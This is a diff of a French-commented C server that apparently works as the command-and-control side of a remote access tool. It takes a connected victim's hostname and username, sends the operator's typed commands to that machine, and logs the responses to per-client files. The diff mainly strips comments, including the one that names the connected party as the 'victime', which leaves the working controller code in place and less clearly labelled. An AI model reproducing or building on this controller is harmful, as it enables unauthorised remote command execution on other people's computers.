@@ -18,7 +18,7 @@
 #define LOG_FILE "./server.log"
 #define LOG_DIR "clients_logs"
 
-int server_socket = -1; // Variable pour stocker le socket du serveur
+int server_socket = -1;
 
 // Fonction pour écrire dans le fichier log principal
 void write_log(const char *message) {
@@ -26,7 +26,7 @@ void write_log(const char *message) {
     if (log_file) {
         time_t now = time(NULL);
         char *timestamp = ctime(&now);
-        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
+        timestamp[strlen(timestamp) - 1] = '\0';
         fprintf(log_file, "[%s] %s\n", timestamp, message);
         fclose(log_file);
     } else {
@@ -43,7 +43,7 @@ void init_client_log(const char *client_ip) {
     if (file) {
         time_t now = time(NULL);
         char *timestamp = ctime(&now);
-        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
+        timestamp[strlen(timestamp) - 1] = '\0';
         fprintf(file, "=== Connexion du client %s à %s ===\n", client_ip, timestamp);
         fclose(file);
     }
@@ -58,7 +58,7 @@ void log_client_data(const char *client_ip, const char *data) {
     if (file) {
         time_t now = time(NULL);
         char *timestamp = ctime(&now);
-        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
+        timestamp[strlen(timestamp) - 1] = '\0';
         fprintf(file, "[%s] %s\n", timestamp, data);
         fclose(file);
     }
@@ -75,7 +75,6 @@ void *client_handler(void *client_socket) {
     char client_ip[INET_ADDRSTRLEN];
     char hostname[BUFFER_SIZE], username[BUFFER_SIZE];
 
-    // Récupérer l'IP du client
     if (getpeername(sock, (struct sockaddr *)&client_addr, &addr_len) == -1) {
         perror("Erreur récupération IP client");
         close(sock);
@@ -85,13 +84,10 @@ void *client_handler(void *client_socket) {
 
     printf("Client connecté : %s\n", client_ip);
 
-    // Créer le dossier clients si inexistant
     mkdir(LOG_DIR, 0777);
 
-    // Initialiser le fichier log du client avec la date de connexion
     init_client_log(client_ip);
 
-    // Attendre les informations de la victime (Hostname et Username)
     memset(buffer, 0, BUFFER_SIZE);
     int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
     if (bytes_received <= 0) {
@@ -108,25 +104,21 @@ void *client_handler(void *client_socket) {
     sscanf(buffer, "Hostname: %s\nUsername: %s", hostname, username);
     printf("Hostname: %s\nUsername: %s\n", hostname, username);
 
-    // Loguer les informations du client (Hostname et Username)
     char log_entry[BUFFER_SIZE];
     snprintf(log_entry, sizeof(log_entry), "Hostname: %s\nUsername: %s", hostname, username);
     log_client_data(client_ip, log_entry);
 
     // Boucle pour envoyer les commandes après réception des informations
     while (1) {
-        // Attendre une commande depuis l'utilisateur du serveur
+
         printf("Entrer une commande à envoyer : ");
         fgets(buffer, BUFFER_SIZE, stdin);
 
-        // Supprimer le '\n' à la fin
         buffer[strcspn(buffer, "\n")] = 0;
 
-        // Logger la commande
         snprintf(log_entry, sizeof(log_entry), "Commande envoyée : %s", buffer);
         log_client_data(client_ip, log_entry);
 
-        // Envoyer la commande au client
         if (send(sock, buffer, strlen(buffer), 0) == -1) {
             perror("Erreur d'envoi");
             break;
@@ -151,21 +143,18 @@ void *client_handler(void *client_socket) {
             }
 
             total_bytes_received += bytes_received;
-            temp_buffer[bytes_received] = '\0'; // Ajouter le caractère de fin de chaîne
+            temp_buffer[bytes_received] = '\0';
 
             // Ajouter ce qui a été reçu dans le buffer complet
             strncat(buffer, temp_buffer, sizeof(buffer) - strlen(buffer) - 1);
 
-            // Si la réponse est terminée, on sort de la boucle
             if (bytes_received < sizeof(temp_buffer) - 1) {
                 break;
             }
         }
 
-        // Afficher la réponse complète du client
         printf("Réponse du client : %s\n", buffer);
 
-        // Logger la réponse
         log_client_data(client_ip, buffer);
     }
 
